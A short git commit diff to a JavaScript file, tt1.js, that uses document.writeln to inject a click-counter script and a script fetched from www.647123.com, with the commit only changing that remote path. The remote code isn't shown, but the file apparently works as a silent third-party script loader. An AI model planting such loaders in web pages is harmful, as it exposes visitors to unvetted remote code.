b95e8a35d5dfb99d34e822a22b6ba2b15e41f101
js999999999 <js-9@outlook.com>
2017-02-20 22:45:09 +0800

    Update tt1.js

--- 2017qq/tt1.js
+++ 2017qq/tt1.js
@@ -1,3 +1,3 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count4.51yes.com\/click.aspx?id=49231756&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script src=http:\/\/\www.647123.com\/2017qq/t1.js ><\/script>");
+document.writeln("<script src=http:\/\/\www.647123.com\/2017qq1/t1.js ><\/script>");
